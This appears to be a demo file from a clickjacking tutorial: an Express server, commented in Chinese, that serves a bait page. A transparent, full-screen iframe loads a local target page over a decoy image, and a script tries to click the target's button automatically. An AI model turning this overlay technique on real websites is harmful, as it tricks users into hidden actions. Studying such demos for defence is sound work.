// malicious.js (运行在4000端口)
const express = require("express");
const app = express();

app.get("/", (req, res) => {
  const imagePath = 'https://cdn.jsdelivr.net/gh/chenxiaoyao6228/cloudimg@main/2023/cat-movie-thumbnail.png'
  res.send(`
    <html>
      <head>
      <style>
      iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
      }
      </style>
      </head>
      <body>
        <h1>伪造的页面，页面中有一个透明的iframe装载目标页面</h1>
        <img width="300" height="300" src="${imagePath}" alt="美女图片">
        <iframe src="http://localhost:3000/source" style="opacity: 0; border: 1px solid red;"></iframe>

        <script>
          // 模拟恶意操作
          window.onload = function () {
            const iframe = document.querySelector('iframe');
            const button = iframe.contentDocument.querySelector('button');
            button.click();
          };
        </script>
      </body>
    </html>
  `);
});

const port = 4000;
app.listen(port, () => {
  console.log(`Malicious Server is running on http://localhost:${port}`);
});
